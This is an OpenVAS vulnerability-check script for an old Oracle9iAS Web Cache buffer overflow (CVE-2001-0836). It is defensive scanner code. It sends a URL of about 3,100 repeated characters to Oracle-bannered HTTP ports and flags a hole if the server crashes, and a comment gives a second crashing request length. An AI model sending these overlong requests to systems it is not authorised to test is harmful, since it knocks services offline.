# OpenVAS Vulnerability Test
# $Id: oracle9iAS_too_long_url.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Oracle9iAS too long URL
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It may be possible to make the Oracle9i application server
crash or execute arbitrary code by sending it a too long url
specially crafted URL.";

tag_solution = "Upgrade your server.";

# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0

if(description)
{
 script_id(11081);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3443);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2001-0836");
 name = "Oracle9iAS too long URL";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Oracle9iAS buffer overflow";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 1100, 4000, 4001, 4002);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
include("http_func.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:1100);
ports = add_port_in_list(list:ports, port:4000);
ports = add_port_in_list(list:ports, port:4001);
ports = add_port_in_list(list:ports, port:4002);

foreach port (ports)
{
 if(!http_is_dead(port:port))
 {
 banner = get_http_banner(port:port);
 if(!banner)exit(0);
 if("Oracle" >!< banner)exit(0);
 url = string("/", crap(data: "A", length: 3095), crap(data: "N", length: 4));
 soc = http_open_socket(port);
 if(soc)
  {
  r = http_get(item: url, port: port);
  send(socket:soc, data:r);
  a = http_recv(socket: soc);
  http_close_socket(soc);

  if(http_is_dead(port: port, retry:4)) {
	security_hole(port);
	set_kb_item(name:"www/too_long_url_crash", value:TRUE);
   }
  }
 }
}

# Note: sending 'GET /<3571 x A> HTTP/1.0' will kill it too.
